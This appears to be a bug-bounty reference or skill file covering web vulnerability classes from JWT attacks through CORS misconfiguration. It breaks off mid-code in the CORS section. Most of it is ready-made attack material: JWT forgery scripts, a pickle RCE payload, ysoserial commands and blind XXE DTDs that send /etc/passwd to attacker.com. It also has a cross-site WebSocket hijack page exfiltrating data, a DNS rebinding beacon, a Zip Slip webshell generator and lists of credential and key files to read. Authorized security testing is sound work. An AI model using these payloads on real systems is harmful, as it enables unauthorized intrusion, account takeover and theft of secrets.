---
name: exotic-vulns
description: 35 exotic and less-known web vulnerability classes (21-55) that most hunters miss. Covers JWT attacks, prototype pollution, deserialization, XXE, WebSockets, HTTP/2 desync, DNS rebinding, CORS deep, insecure randomness, LDAP injection, NoSQL expanded, rate limit bypass, clickjacking advanced, CRLF injection, web cache deception, server-side prototype pollution, postMessage, CSS injection, dangling markup, ESI injection, PDF SSRF, email header injection, subdomain delegation takeover, OAuth token theft via Referer, timing side channels, integer overflow, ReDoS, host header poisoning expanded, GraphQL deep, dependency confusion, client-side desync, HTTP parameter pollution, mass assignment, path traversal expanded, WebSocket IDOR. Use when hunting less-saturated bug classes that pay big.
---

# EXOTIC VULN CLASSES — 35 Classes (21-55)

Less-saturated, high-signal bug classes. Root cause, payloads, bypass tables, impact chains.

---

## 21. JWT ATTACKS
> Incorrectly implemented JWT validation is trivially exploitable and still extremely common.

### Root Cause
JWTs have three parts: header.payload.signature. Signature validation logic errors let attackers forge tokens without the secret key.

```python
# VULNERABLE — accepts alg from header (attacker-controlled!)
import jwt
def verify_token(token):
    header = jwt.get_unverified_header(token)
    return jwt.decode(token, SECRET, algorithms=[header['alg']])  # NEVER do this

# SECURE
def verify_token(token):
    return jwt.decode(token, SECRET, algorithms=['RS256'])  # hardcode allowed alg
```

### Variants

**V1: alg=none Attack**
```bash
# Original header
{"alg":"RS256","typ":"JWT"}

# Attacker modifies to
{"alg":"none","typ":"JWT"}

# Remove signature entirely — just base64(header).base64(payload).
python3 -c "
import base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).rstrip(b'=')
print(f'{header.decode()}.{payload.decode()}.')
"
```

**V2: RS256 → HS256 Downgrade**
```bash
# Server has PUBLIC key. If HS256 accepted, sign with PUBLIC KEY as HMAC secret.
# Python script
import hmac, hashlib, base64, json

public_key = open('public.pem', 'rb').read()
header = base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({'sub':'admin'}).encode()).rstrip(b'=')
sig_input = header + b'.' + payload
sig = hmac.new(public_key, sig_input, hashlib.sha256).digest()
sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=')
print(f"{header.decode()}.{payload.decode()}.{sig_b64.decode()}")
```

**V3: kid Injection**
```json
// kid = Key ID — fetched from a datastore to select signing key
// VULNERABLE: used in SQL query or filesystem path

// SQLi via kid
{"alg":"HS256","typ":"JWT","kid":"' UNION SELECT 'attacker_secret'--"}
// Sign token with 'attacker_secret'

// Path traversal via kid
{"alg":"HS256","typ":"JWT","kid":"../../../../dev/null"}
// Sign with empty string (contents of /dev/null)

// Command injection via kid (rare but exists)
{"alg":"HS256","typ":"JWT","kid":"key|curl attacker.com/$(cat /etc/passwd)|"}
```

**V4: jku / x5u Spoofing**
```json
// jku = JSON Web Key Set URL — server fetches keys from this URL
// Attacker hosts their own JWKS
{"alg":"RS256","typ":"JWT","jku":"https://attacker.com/jwks.json"}

// Attacker's jwks.json:
{
  "keys": [{
    "kty": "RSA",
    "n": "<attacker_public_key_n>",
    "e": "AQAB",
    "kid": "attacker-key"
  }]
}
// Attacker signs with their private key — server fetches from jku and validates!
```

**V5: Embedded JWK Attack**
```json
// jwk header embeds public key — if server uses it to verify, attacker wins
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "<attacker_generated_n>",
    "e": "AQAB"
  }
}
// Sign with matching private key, embed public key in header
```

**V6: Claim Tampering**
```bash
# Decode without verification, modify claims, re-encode
# Targets: exp (expiry), sub (subject/user id), role, admin, scope, iss
python3 -c "
import base64, json
parts = 'eyJh...TOKEN...xyz'.split('.')
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
payload['role'] = 'admin'
payload['exp'] = 9999999999
print(payload)
"
```

### Testing Checklist
```
[ ] Decode JWT at jwt.io — check alg field
[ ] Send token with alg=none (empty signature)
[ ] Send token with alg changed from RS256 to HS256
[ ] Inject SQLi into kid parameter
[ ] Inject path traversal into kid: ../../../../dev/null (sign with empty string)
[ ] Test jku pointing to attacker-controlled JWKS
[ ] Test embedded jwk in header
[ ] Check if exp claim is actually validated (set to past timestamp)
[ ] Check if iss (issuer) is validated
[ ] Test sub/role/admin claim tampering
```

### Bypass Table

| Bypass | Payload | Works When |
|---|---|---|
| alg=none | `{"alg":"none"}` + no sig | Library accepts none algorithm |
| RS256→HS256 | Sign with public key as HMAC | Server has RS256 key, accepts HS256 |
| kid SQLi | `' UNION SELECT 'secret'--` | kid used in raw SQL |
| kid null | `../../../../dev/null` | kid used as file path, HMAC ok with empty key |
| jku | Point to attacker JWKS | jku URL not allowlisted |
| jwk embed | Embed attacker pub key | Server uses embedded jwk header |
| exp bypass | Set exp to 9999999999 | Expiry not checked |

### Impact Chain
- JWT alg=none → forge admin token → **Critical (ATO, privilege escalation)**
- JWT kid SQLi → extract database secrets → **Critical (data breach)**
- JWT jku spoofing → impersonate any user → **Critical**
- JWT claim tampering on weak validation → role elevation → **High**

### Real-World Notes
- **PortSwigger Labs**: All JWT variants covered; extensive lab series
- **CVE-2022-21449 (Psychic Signatures)**: Java ECDSA JWT bypass — blank signature accepted
- Tool: `jwt_tool.py` by ticarpi — covers all attacks above
- Tool: `python-jwt` / `pyjwt` — test with `algorithms=["none"]` config errors

---

## 22. PROTOTYPE POLLUTION
> Modifying Object.prototype in JavaScript contaminates all objects — leads to RCE on server, DOM XSS on client.

### Root Cause
```javascript
// VULNERABLE — recursive merge without key sanitization
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];  // sets __proto__.isAdmin = true on Object.prototype!
        }
    }
}

merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
console.log({}.isAdmin);  // true — ALL objects now have isAdmin!
```

### Server-Side (Node.js) Attacks

**V1: __proto__ Pollution**
```bash
# HTTP request with JSON body
POST /api/settings
{"__proto__": {"isAdmin": true}}

# Or nested:
{"constructor": {"prototype": {"isAdmin": true}}}

# Query string pollution
?__proto__[isAdmin]=true
?constructor[prototype][isAdmin]=true
```

**V2: RCE via Polluted spawn Options**
```javascript
// If app does child_process.spawn(cmd, args, options)
// and options come from a polluted object:
{"__proto__": {"shell": "/bin/bash", "env": {"NODE_OPTIONS": "--inspect=0.0.0.0"}}}
// Or classic shell injection via shell option pollution
{"__proto__": {"shell": true}}
```

**V3: Server-Side PP Detection Gadgets**
```bash
# Status code override gadget
{"__proto__": {"status": 555}}
# If response comes back as 555 — PP confirmed!

# JSON spaces gadget
{"__proto__": {"json spaces": 7}}
# If response JSON is indented with 7 spaces — PP confirmed!

# Content-Type gadget
{"__proto__": {"content-type": "text/html"}}
# If response Content-Type changes — PP confirmed!
```

### Client-Side (DOM) Attacks

**V1: DOM XSS via Polluted Property**
```javascript
// Gadget: code reads Object.prototype.innerHTML or similar
// Pollution via URL hash or localStorage
location.hash = '#__proto__[innerHTML]=<img src=x onerror=alert(1)>'

// Lodash merge (pre-4.17.5)
_.merge({}, JSON.parse(location.hash.slice(1)));
```

**V2: Universal XSS via Library Gadgets**
```javascript
// jQuery $.extend deep merge (before patch)
$.extend(true, {}, JSON.parse(userInput));

// Pollute srcdoc on iframes, href on links, src on script tags
{"__proto__": {"srcdoc": "<script>alert(document.domain)</script>"}}
```

### Testing Checklist
```
[ ] Send __proto__ key in JSON body, form data, URL params
[ ] Send constructor.prototype key variants
[ ] Check response for status code changes (555 gadget)
[ ] Check response JSON formatting changes (json spaces gadget)
[ ] Check response Content-Type changes
[ ] Grep JS source for _.merge, $.extend, Object.assign with user input
[ ] Grep for recursive merge utility functions
[ ] Test URL hash/fragment for client-side gadgets
[ ] Test localStorage manipulation
[ ] Use PPScan (Burp extension) for automated detection
```

### Impact Chain
- Server PP + status gadget = **Confirmed PP** (Medium at minimum)
- Server PP + spawn shell option = **RCE** (Critical)
- Client PP + DOM gadget = **XSS** (Medium–High)
- PP + privilege bypass (isAdmin=true) = **Privilege Escalation** (Critical)

### Real-World Notes
- **CVE-2019-10744**: Lodash `defaultsDeep` PP — RCE in server contexts
- **HackerOne $10,000+ reports** for server-side PP leading to RCE in Node.js apps
- Scanner: `ppmap` by nicolo-ribaudo, `server-side-prototype-pollution` Burp extension

---

## 23. INSECURE DESERIALIZATION
> Deserializing untrusted data can trigger code execution during object reconstruction.

### Root Cause
Serialization converts objects to byte streams; deserialization reconstructs them. If the class reconstructed has dangerous methods (`readObject`, `__reduce__`, `__wakeup`), attacker controls code execution.

### Detection Signatures

| Platform | Magic Bytes / Pattern | Notes |
|---|---|---|
| Java | `rO0AB` (base64) or `AC ED 00 05` (hex) | Java ObjectInputStream |
| PHP | `a:2:{...}` or `O:4:"User":...` | PHP serialize() format |
| Python pickle | `\x80\x02` or base64 of gASV... | Python pickle protocol |
| Ruby Marshal | `\x04\x08` | Ruby Marshal.dump |
| .NET | `AAEAAAD` (base64) or BinaryFormatter | .NET BinaryFormatter |
| .NET JSON | `$type` key in JSON | TypeNameHandling enabled |

### Java Deserialization
```bash
# Detect: look for rO0AB in cookies, POST bodies, X-Auth headers
echo "rO0AB..." | base64 -d | xxd | head  # Should show AC ED 00 05

# Exploit with ysoserial
java -jar ysoserial.jar CommonsCollections6 'curl attacker.com/$(id)' | base64 -w0

# Common gadget chains (try all):
# CommonsCollections1-7, Spring1-4, Hibernate1-5, URLDNS (DNS only, safe for detection)

# URLDNS (safe detection — DNS callback only, no RCE side effects)
java -jar ysoserial.jar URLDNS 'http://uniqueid.attacker.burpcollaborator.net' | base64 -w0
```

### PHP Deserialization
```php
// VULNERABLE
$data = unserialize($_COOKIE['user_data']);

// Magic methods that execute during deserialization:
// __wakeup(), __destruct(), __toString()

// Example gadget
class FileHandler {
    public $path;
    public function __destruct() {
        unlink($this->path);  // deletes file!
    }
}
// Payload: O:11:"FileHandler":1:{s:4:"path";s:20:"/var/www/config.php";}

// POP chain via __toString()
class Logger {
    public $filename;
    public $data;
    public function __toString() {
        file_put_contents($this->filename, $this->data);  // write arbitrary file!
    }
}
```

### Python Pickle
```python
# VULNERABLE
import pickle
data = pickle.loads(user_supplied_bytes)

# Exploit — __reduce__ executes OS command on deserialization
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl attacker.com/$(id)',))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload)
# Send this in any field that gets pickle.loads() called on it
```

### Ruby Marshal
```ruby
# VULNERABLE
data = Marshal.load(Base64.decode64(params[:session]))

# Gadget chains via ruby2_keywords or universal gadget from Rack
# Use tool: universal-deserialisation-gadget-for-ruby-2.x
```

### .NET ViewState
```bash
# ViewState is base64+gzip serialized .NET objects
# If __VIEWSTATEGENERATOR reveals machine key, or __VIEWSTATEMAC=false:
# Use ysoserial.net to generate payload

ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "ping attacker.com" --path="/page.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="KEY" --validationalg="SHA1" --validationkey="KEY"
```

### Testing Checklist
```
[ ] Search cookies, POST bodies, headers for base64 data
[ ] Decode and check for magic bytes (rO0AB, a:, \x80\x02)
[ ] Send Java URLDNS payload for safe DNS-based detection
[ ] Check PHP responses for unserialize errors with malformed input
[ ] Check .NET apps for __VIEWSTATE parameter with weak MAC
[ ] Look for $type in JSON responses (.NET TypeNameHandling)
[ ] Test file upload paths for phar:// deserialization (PHP)
[ ] Check Redis/Memcached cached objects for deserialized data
```

### Impact Chain
- Deserialization + URLDNS callback = **Confirmed vector** (Medium — escalate to RCE attempt)
- Deserialization + RCE gadget = **Critical RCE**
- PHP phar:// via file inclusion + upload = **Critical RCE**
- .NET ViewState + weak key = **Critical RCE**

---

## 24. XXE — XML EXTERNAL ENTITY
> Injecting XML entities to read files, perform SSRF, or cause DoS.

### Root Cause
```xml
<!-- XML parser resolves external entities by default in misconfigured parsers -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
<!-- Parser replaces &xxe; with contents of /etc/passwd -->
```

### Classic XXE
```xml
<!-- Read local file -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><name>&xxe;</name></root>

<!-- SSRF to internal network -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>

<!-- Windows file read -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
<root><data>&xxe;</data></root>
```

### Blind OOB XXE
```xml
<!-- No output in response — use out-of-band exfiltration -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root><data>test</data></root>

<!-- attacker.com/evil.dtd: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY exfildata SYSTEM 'http://attacker.com/?data=%file;'>">
%exfil;
&exfildata;
```

### SVG XXE
```xml
<!-- SVG files are XML — upload SVG to image upload endpoint -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
<!-- Any endpoint that processes SVG/renders images may trigger XXE -->
```

### DOCX / XLSX XXE
```bash
# Office files are ZIP archives containing XML
# Inject XXE into word/document.xml or xl/workbook.xml
unzip document.docx -d docx_dir
# Edit docx_dir/word/document.xml — add DOCTYPE + entity
# Re-zip and upload
cd docx_dir && zip -r ../evil.docx .
```

### SOAP XXE
```xml
<!-- SOAP endpoints accept XML — inject into SOAP body -->
POST /ws/api HTTP/1.1
Content-Type: text/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser><id>&xxe;</id></GetUser>
  </soap:Body>
</soap:Envelope>
```

### Parameter Entity XXE (bypass input validation)
```xml
<!-- When regular entities are filtered, try parameter entities -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % read SYSTEM "file:///etc/passwd">
  <!ENTITY % wrap "<!ENTITY send SYSTEM 'http://attacker.com/?%read;'>">
  %wrap;
]>
<root>&send;</root>
```

### Testing Checklist
```
[ ] Find any XML input (Content-Type: application/xml, text/xml)
[ ] Check SOAP endpoints (/ws/, /api/soap, /services/)
[ ] Try SVG upload on image upload endpoints
[ ] Try DOCX/XLSX upload on document import endpoints
[ ] Send classic XXE with file:///etc/passwd
[ ] If no output, try blind OOB with Burp Collaborator
[ ] Try SSRF via XXE to cloud metadata endpoint
[ ] Test Content-Type change: JSON → XML with XXE
[ ] Test error-based XXE (malformed entity triggers verbose error with file contents)
```

### Bypass Table

| Block | Bypass | Notes |
|---|---|---|
| Entity filtered | Parameter entities `%` | Different parser code path |
| DOCTYPE blocked | Content-Type: text/html with XML | Some parsers still parse |
| File:// blocked | http:// for SSRF | Alternative protocol |
| Output absent | OOB via Collaborator | Blind detection |
| XML declaration stripped | Inject DOCTYPE directly | Some parsers still process |

### Impact Chain
- XXE + file read (/etc/passwd) = **Medium** (info disclosure)
- XXE + file read (/etc/shadow, private keys, .env) = **High–Critical**
- XXE + SSRF to metadata = **Critical** (cloud key theft)
- XXE OOB confirmed = **Medium**, escalate to full file read

---

## 25. WEBSOCKET VULNERABILITIES
> WebSocket connections often skip security checks applied to HTTP requests.

### Root Cause
```javascript
// VULNERABLE — WebSocket server doesn't validate Origin header
wss.on('connection', (ws, req) => {
    // Never checks req.headers.origin!
    ws.on('message', (msg) => {
        const data = JSON.parse(msg);
        sendMessageToUser(data.toUserId, data.content);  // no auth check on toUserId
    });
});
```

### V1: Cross-Site WebSocket Hijacking (CSWSH)
```html
<!-- If WebSocket auth relies on session cookie and no Origin check: -->
<!-- Attacker page: -->
<script>
var ws = new WebSocket('wss://victim.com/ws');
ws.onopen = function() {
    // Browser auto-sends victim's cookies!
    ws.send(JSON.stringify({action: 'get_user_data'}));
};
ws.onmessage = function(e) {
    fetch('https://attacker.com/steal?data=' + btoa(e.data));
};
</script>

<!-- If CSWSH works: victim visits attacker page, WS opens with victim session -->
```

### V2: Auth Bypass on WebSocket Upgrade
```bash
# HTTP handshake has auth — WebSocket connection does not
# Upgrade to WS after auth check, then send unauthorized commands

# Test: open WS from unauthenticated context
wscat -c wss://target.com/ws
# Send commands meant for authenticated users
{"action": "get_admin_panel"}
{"action": "list_users"}
```

### V3: IDOR via WebSocket
```javascript
// Client sends own userId — server doesn't validate ownership
ws.send(JSON.stringify({
    action: 'get_messages',
    userId: '12345'  // change to another user's ID
}));

// Test: capture WS messages in Burp, change userId/roomId/orderId values
```

### V4: Message Injection / XSS via WebSocket
```javascript
// If WebSocket messages are reflected into DOM unsanitized:
ws.send(JSON.stringify({
    message: '<script>alert(document.domain)</script>',
    room: 'general'
}));
```

### V5: Origin Validation Bypass
```bash
# Test null origin
Origin: null

# Test substrings (regex bypass)
Origin: https://evil-victim.com  # contains "victim.com"
Origin: https://victim.com.evil.com

# Test case variation
Origin: https://VICTIM.COM
```

### Testing Checklist
```
[ ] Intercept WebSocket upgrade request in Burp
[ ] Check if session cookie is used for auth (CSWSH candidate)
[ ] Check if Origin header is validated — try null, evil variants
[ ] Send CSWSH PoC page, verify victim data returns
[ ] Replay WS messages in Burp Repeater with different user IDs
[ ] Test unauthenticated WS connections (skip HTTP auth)
[ ] Inject XSS payloads into WS message fields
[ ] Check if WS messages trigger server-side SQL/NoSQL operations
[ ] Test WS message flooding (rate limit missing)
```

### Impact Chain
- CSWSH + sensitive data in WS = **High** (data theft)
- CSWSH + action execution (transfer, password change) = **Critical** (ATO)
- WS IDOR = same as HTTP IDOR, treat as **Medium–High**
- WS XSS = **Medium–High** depending on context

---

## 26. HTTP PARAMETER POLLUTION
> Sending duplicate parameters confuses backend parsing logic, WAFs, and authentication checks.

### Root Cause
Different frameworks handle duplicate parameters differently:

| Technology | `?a=1&a=2` result | Notes |
|---|---|---|
| ASP.NET | `1,2` (joined) | Comma-separated |
| Flask/Python | `1` (first) | Takes first value |
| PHP | `2` (last) | Takes last value |
| Node.js/Express | `['1','2']` (array) | Array of all values |
| Apache Tomcat | `1` (first) | Takes first |
| WAF layer | varies | Often takes first |

### Server-Side HPP
```bash
# WAF checks first value, backend uses last (or vice versa)
GET /transfer?amount=100&toAccount=attacker&toAccount=victim_account_id

# Signature bypass
POST /api/sign
amount=100&signature=valid_sig_for_100&amount=1000000
# If signer uses first, executor uses last = signature bypass!

# OAuth scope pollution
GET /oauth/authorize?scope=read&scope=admin&client_id=app
# Some parsers give admin scope when read was validated by WAF
```

### Client-Side HPP
```html
<!-- Inject into existing links/forms -->
<!-- Original link: /search?query=normal -->
<!-- Attacker injects via XSS or open redirect: -->
<a href="/transfer?amount=100&toAccount=attacker%26toAccount=victim">Click</a>
<!-- URL decoded: /transfer?amount=100&toAccount=attacker&toAccount=victim -->
```

### WAF Bypass via HPP
```bash
# WAF sees first param (clean), backend uses second (malicious)
GET /search?q=clean&q=<script>alert(1)</script>
POST /login?username=admin&username=admin'--

# Array bypass
GET /search?q[]=clean&q[]=malicious
```

### Testing Checklist
```
[ ] Add duplicate parameters to all critical endpoints
[ ] Test both GET (query string) and POST (body) parameters
[ ] Try array notation: param[], param[0]
[ ] Test critical operations: payment amount, recipient, scope
[ ] Combine HPP with WAF bypass attempts
[ ] Test HPP on OAuth authorize endpoint (scope inflation)
[ ] Try HPP to bypass rate limiting (different param casing)
```

### Impact Chain
- HPP + signature bypass = **Critical** (financial fraud)
- HPP + WAF bypass = enables SQLi/XSS previously blocked
- HPP + OAuth scope = **High** (privilege escalation)

---

## 27. MASS ASSIGNMENT
> Frameworks automatically bind request parameters to object properties — including ones that shouldn't be user-controllable.

### Root Cause
```ruby
# Rails — VULNERABLE (old pattern)
def create
  @user = User.new(params[:user])  # All params merged into user!
  @user.save
end
# Attacker sends: {"user": {"name": "Alice", "admin": true}}

# Rails SECURE — strong parameters
def user_params
  params.require(:user).permit(:name, :email, :password)  # whitelist only
end
```

```javascript
// Node.js/Express — VULNERABLE
app.post('/users', async (req, res) => {
    const user = await User.create(req.body);  // Entire body merged!
    res.json(user);
});
// Attacker sends: {"name":"Alice","isAdmin":true,"balance":999999}
```

### Hidden Admin Fields to Try
```bash
# Common privileged field names (try all in registration/profile update):
admin=true
isAdmin=true
role=admin
role=superuser
access_level=99
permissions[]=admin
user[admin]=1
account_type=premium
subscription=enterprise
credits=99999
balance=999999
verified=true
confirmed=true
active=true
banned=false
```

### GraphQL Mutation Mass Assignment
```graphql
# App only exposes name and email in docs, but role is in the model
mutation {
  updateUser(input: {
    name: "Alice"
    email: "alice@evil.com"
    role: ADMIN          # undocumented field — try it!
    isVerified: true     # try undocumented fields
  }) {
    id
    role
  }
}
```

### Testing Checklist
```
[ ] Intercept registration and profile update requests
[ ] Add admin/isAdmin/role fields to request body
[ ] Check response — does it reflect the new field value?
[ ] Try nested objects: user[role]=admin
[ ] Look at full user object in API response to discover all fields
[ ] Try GraphQL introspection to find undocumented mutation fields
[ ] Test API mass assignment on object creation vs update
[ ] Add financial fields: balance, credits, subscription_tier
```

### Impact Chain
- Mass assignment + role=admin = **Critical** (full privilege escalation)
- Mass assignment + balance=999999 = **Critical** (financial fraud)
- Mass assignment + verified=true = **High** (bypass email verification)
- Mass assignment + banned=false = **Medium** (security control bypass)

---

## 28. PATH TRAVERSAL EXPANDED
> Reading files outside the web root via directory traversal sequences.

### Root Cause
```python
# VULNERABLE
@app.route('/download')
def download():
    filename = request.args.get('file')
    return send_file(f'/var/www/uploads/{filename}')
    # ?file=../../etc/passwd reads /etc/passwd!

# SECURE
import os
def download():
    filename = request.args.get('file')
    safe_path = os.path.realpath(os.path.join('/var/www/uploads', filename))
    if not safe_path.startswith('/var/www/uploads'):
        abort(403)
    return send_file(safe_path)
```

### Bypass Variants

| Technique | Payload | Why it works |
|---|---|---|
| Classic | `../../../etc/passwd` | Direct traversal |
| Double encoding | `%252e%252e%252f` | Decoded twice by server |
| URL encoding | `%2e%2e%2f` | Single URL decode |
| Null byte | `../../../etc/passwd%00.jpg` | Truncates at null (old PHP) |
| ..;/ bypass | `..;/..;/etc/passwd` | Some frameworks normalize ..;/ differently |
| Unicode normalization | `..%c0%af` (overlong UTF-8 for /) | Pre-Unicode normalization |
| Windows UNC | `..\\..\\windows\\win.ini` | Windows backslash |
| Double slash | `....//....//etc/passwd` | `../` removed, leaving `../` |
| Path separator mix | `..%2f..%5cetc%2fpasswd` | Mixed forward/back slash |
| Symlink | Upload symlink pointing to /etc | Follows symlinks on extraction |

### High-Value Target Files
```bash
# Linux
/etc/passwd          # user list
/etc/shadow          # password hashes
/etc/hosts           # internal hostnames
/proc/self/environ   # environment variables (may contain secrets)
/proc/self/cmdline   # process command line
~/.ssh/id_rsa        # SSH private key
/var/www/.env        # environment config
/app/config.yml      # app config
/app/.env

# Windows
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\Users\Administrator\.ssh\id_rsa
```

### Zip Slip
```bash
# Archive files (zip/tar) can contain traversal paths in filenames
# Create evil zip:
python3 -c "
import zipfile
zf = zipfile.ZipFile('evil.zip', 'w')
zf.write('/dev/null', '../../../../var/www/html/shell.php')
zf.close()
"
# If app extracts to web root: shell.php deployed!
```

### Testing Checklist
```
[ ] Find all parameters that accept filenames or paths
[ ] Try ../../etc/passwd with all encoding variants
[ ] Test null byte truncation with image extension
[ ] Try Windows paths on any server (..\ variants)
[ ] Test zip/tar file upload for Zip Slip
[ ] Check API endpoints that return file contents
[ ] Test Content-Disposition filename parameter
[ ] Try path traversal in Host header, Accept-Language
[ ] Test double URL encoding through WAFs
```

### Impact Chain
- Path traversal + /etc/passwd = **Low–Medium** (user enumeration)
- Path traversal + /proc/self/environ with secrets = **Critical**
- Path traversal + SSH private key = **Critical** (server access)
- Path traversal + .env file = **Critical** (database creds, API keys)
- Zip Slip + web root write = **Critical** (RCE via webshell)

---

## 29. HTTP/2 DESYNC ATTACKS
> H2 header fields injected with CRLF or length discrepancies cause request smuggling to backend HTTP/1.1 servers.

### Root Cause
HTTP/2 frontend proxies (Nginx, Cloudflare, AWS ALB) may downgrade to HTTP/1.1 for backend. If H2 headers are forwarded verbatim:
- H2.CL: HTTP/2 has no Content-Length but proxy forwards a fake one
- H2.TE: Transfer-Encoding injected via H2 header lands in H1 backend

### H2.CL Smuggling
```
POST / HTTP/2
Host: target.com
Content-Length: 0

GET /admin HTTP/1.1
Host: target.com
X-Ignore: x
```
Frontend processes as one H2 request; backend processes `GET /admin` as a second request.

### H2.TE Smuggling
```
POST / HTTP/2
Host: target.com
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: internal-only.target.com
X-Ignore: X
```

### CRLF in H2 Headers
```
# H2 headers shouldn't contain \r\n but some parsers don't validate:
Header-Name: value\r\nInjected-Header: evil
# Results in request splitting or header injection on backend
```

### H2 Tunnel Vision (Header Name Injection)
```
# Inject a colon in header name — creates new header on downgrade
:method: GET /admin HTTP/1.1\r\n\r\n
```

### Testing with Burp Suite
```
1. Enable HTTP/2 in Burp Proxy options
2. Send request to Repeater
3. Right-click → "Change request to HTTP/2"
4. Use "Inspector" pane to add raw headers with CRLF
5. Enable "Allow HTTP/2 ALPN override" in Burp settings
6. Use HTTP Request Smuggler extension for automation
7. Test H2.CL: set Content-Length to poison next request
8. Check for 302, 403, 404 on smuggled request
```

### Testing Checklist
```
[ ] Check if target uses HTTP/2 (curl --http2 or browser devtools)
[ ] Identify any proxy (Cloudflare, AWS ALB, Nginx) that might downgrade
[ ] Use Burp HTTP/2 mode with raw header injection
[ ] Test H2.CL with Content-Length: 0 and smuggled GET /admin
[ ] Test H2.TE with Transfer-Encoding: chunked injection
[ ] Try CRLF in H2 header values
[ ] Use HTTP Request Smuggler Burp extension scan
[ ] Check for timing differences suggesting queued requests
```

### Impact Chain
- H2 desync + access admin endpoint = **Critical**
- H2 desync + XSS delivery to victims = **High**
- H2 desync + cache poisoning = **High**
- H2 desync + session theft = **Critical**

---

## 30. DNS REBINDING
> Attacker DNS server switches from a legitimate IP to an internal IP after initial browser check.

### Root Cause
```
1. Victim browser visits attacker.com (DNS → attacker IP)
2. Browser loads JavaScript from attacker.com
3. JS checks same-origin: origin = attacker.com ✓ (allowed)
4. Attacker DNS TTL expires (set to 0)
5. JS makes second request: DNS now resolves to 192.168.1.1 (internal router)
6. Browser still thinks it's talking to attacker.com — same-origin OK
7. JS reads response from internal service!
```

### Classic Rebinding Attack
```javascript
// Attacker-hosted JS:
function probe() {
    fetch('http://attacker.com/api/data')  // now resolves to 192.168.1.1
        .then(r => r.text())
        .then(data => {
            // exfiltrate internal service data
            navigator.sendBeacon('https://attacker-collector.com/', data);
        });
}
// Wait for DNS TTL to expire, then probe
setTimeout(probe, 60000);  // after TTL expires
```

### DNS Rebinding to Cloud Metadata
```
1. Register domain: attacker.com
2. Configure DNS: first response = 1.2.3.4 (your server), TTL=0
3. After first resolution: rebind to 169.254.169.254 (AWS metadata)
4. Victim browser (or server-side browser/headless) fetches metadata
```

### Rebinding to Bypass SSRF Filters
```bash
# If app validates URL before fetching:
# Step 1: app resolves attacker.com → legit IP (passes check)
# Step 2: actual fetch: DNS rebinds to 127.0.0.1
# Common with async validation patterns

# Tools for rebind attacks:
# Singularity (nccgroup) — full rebinding attack framework
# rebind.it — online DNS rebinding service for testing
```

### DNS Pinning Bypass
```bash
# Browsers pin DNS for 60 seconds — force new lookup by:
# 1. Wildcard subdomains: aaa.attacker.com, bbb.attacker.com (each gets fresh DNS)
# 2. Multiple A records: round-robin between external and internal
# 3. Very low TTL (0 or 1 second) combined with timing attack
```

### Testing Checklist
```
[ ] Identify any feature that fetches URLs (webhooks, imports, previews)
[ ] Test SSRF with domain that rebinds to 127.0.0.1 after validation
[ ] Check for server-side headless browsers (PDF gen, screenshot tools)
[ ] Use Singularity framework for client-side rebinding PoC
[ ] Test rebind to 169.254.169.254 for cloud apps
[ ] Check if app re-resolves DNS on each request (vulnerable) vs caches IP
```

### Impact Chain
- Rebinding + SSRF filter bypass = **High–Critical**
- Rebinding + cloud metadata = **Critical** (key exfiltration)
- Rebinding + internal service access = **High** (lateral movement)

---

## 31. CORS MISCONFIGURATION DEEP
> Permissive CORS allows cross-origin JS to read authenticated responses.

### Root Cause
```python
# VULNERABLE — reflects Origin from request
@app.after_request
def add_cors(response):
    origin = request.headers.get('Origin')
    response.headers['Access-Control-Allow-Origin'] = origin  # reflects anything!
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response
```

### Bypass Table

| Misconfiguration | Payload Origin | Impact |
|---|---|---|
| Reflect any origin | `Origin: https://evil.com` | Read any authenticated response |
| `null` origin allowed | `Origin: null` (sandbox iframe) | Bypass with sandboxed iframe |
| Weak regex | `Origin: https://evil-victim.com` | Substring match |
| Subdomain wildcard | `Origin: https://evil.victim.com` | If attacker controls subdomain |
| Protocol variation | `Origin: http://victim.com` | HTTP vs HTTPS confusion |
| Trailing dot | `Origin: https://victim.com.` | Some parsers strip trailing dot |

### Null Origin Exploit
```html
<!-- Sandboxed iframes have null origin -->
<iframe sandbox="allow-scripts" srcdoc="
<script>
fetch('https://target.com/api/user', {credentials: 'include'})
